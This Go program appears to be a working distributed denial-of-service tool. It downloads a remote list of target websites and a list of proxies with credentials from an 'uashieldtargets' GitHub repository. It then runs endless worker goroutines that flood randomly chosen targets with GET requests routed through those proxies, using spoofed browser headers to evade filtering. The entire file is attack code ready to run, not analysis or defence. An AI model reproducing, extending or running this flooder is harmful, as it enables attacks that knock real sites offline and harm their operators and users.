package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"
)

type SiteStruct []struct {
	Page string `json:"page"`
}
type ProxyStruct []struct {
	ID   int    `json:"id"`
	IP   string `json:"ip"`
	Auth string `json:"auth,omitempty"`
}

var timeout time.Duration
var workers int
var useProxy bool
var onlyOk bool

func getSites() SiteStruct {

	url := "https://raw.githubusercontent.com/opengs/uashieldtargets/v2/sites.json"

	spaceClient := http.Client{
		Timeout: time.Second * 10, // Timeout after 2 seconds
	}

	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		log.Fatal(err)
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36")

	res, getErr := spaceClient.Do(req)
	if getErr != nil {
		log.Fatal(getErr)
	}

	if res.Body != nil {
		defer res.Body.Close()
	}

	body, readErr := ioutil.ReadAll(res.Body)
	if readErr != nil {
		log.Fatal(readErr)
	}

	var sites SiteStruct

	jsonErr := json.Unmarshal(body, &sites)
	if jsonErr != nil {
		log.Fatal(jsonErr)
	}
	return sites
}
func getProxies() ProxyStruct {

	url := "https://raw.githubusercontent.com/opengs/uashieldtargets/v2/proxy.json"
	spaceClient := http.Client{
		Timeout: time.Second * 10, // Timeout after 2 seconds
	}

	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		log.Fatal(err)
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36")

	res, getErr := spaceClient.Do(req)
	if getErr != nil {
		log.Fatal(getErr)
	}

	if res.Body != nil {
		defer res.Body.Close()
	}

	body, readErr := ioutil.ReadAll(res.Body)
	if readErr != nil {
		log.Fatal(readErr)
	}

	var sites ProxyStruct

	jsonErr := json.Unmarshal(body, &sites)
	if jsonErr != nil {
		log.Fatal(jsonErr)
	}
	return sites
}

func requestMe(target string, proxyUrl string, proxyAuth string) {
	var myClient *http.Client
	if useProxy {
		if len(proxyAuth) > 0 {
			split := strings.Split(proxyAuth, ":")
			myClient = &http.Client{Transport: &http.Transport{Proxy: http.ProxyURL(&url.URL{
				Scheme: "http",
				User:   url.UserPassword(split[0], split[1]),
				Host:   proxyUrl,
			})}, Timeout: timeout}
		} else {
			myClient = &http.Client{Transport: &http.Transport{Proxy: http.ProxyURL(&url.URL{
				Scheme: "http",
				Host:   proxyUrl,
			})}, Timeout: timeout}
		}

	} else {
		myClient = &http.Client{Timeout: timeout}
	}
	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		return
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/533.36 (KHTML, like Gecko) Chrome/98.0.4744.51 Safari/533.36")
	req.Header.Set("referer", "https://google.com/")
	req.Header.Set("accept", "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.9")
	resp, err := myClient.Do(req)
	if err != nil {
		if !onlyOk {
			log.Println(err)
		}
		return
	}
	_, err2 := ioutil.ReadAll(resp.Body)
	if err2 != nil {
		if !onlyOk {
			log.Println(err)
		}
		return
	}
	log.Printf("200 OK!")
}

func gogogo(sites SiteStruct, proxies ProxyStruct, ebus chan int, id int) {
	nSite := rand.Int() % len(sites)
	nProxy := rand.Int() % len(proxies)

	site := sites[nSite]
	proxy := proxies[nProxy]
	requestMe(site.Page, proxy.IP, proxy.Auth)
	ebus <- id

}

func spawner(sites SiteStruct, proxies ProxyStruct, ebus chan int) {
	for true {
		id := <-ebus
		go gogogo(sites, proxies, ebus, id)
	}
}

func main() {
	workers, _ = strconv.Atoi(os.Getenv("WORKERS"))
	timeoutFrom, _ := strconv.Atoi(os.Getenv("TIMEOUT"))
	timeout = time.Duration(timeoutFrom) * time.Millisecond
	useProxyOS := os.Getenv("USEPROXY")
	useProxy = useProxyOS == "true"
	onlyOkOs := os.Getenv("ONLYOK")
	onlyOk = onlyOkOs == "true"

	rand.Seed(time.Now().Unix())
	eventbus := make(chan int)
	sites := getSites()
	proxies := getProxies()
	for i := 0; i < workers/100; i++ {
		fmt.Println("Spawning spawner", i)
		go spawner(sites, proxies, eventbus)
	}
	for i := 0; i < workers; i++ {
		fmt.Println("Spawning worker", i)
		go gogogo(sites, proxies, eventbus, i)
	}
	spawner(sites, proxies, eventbus)
}
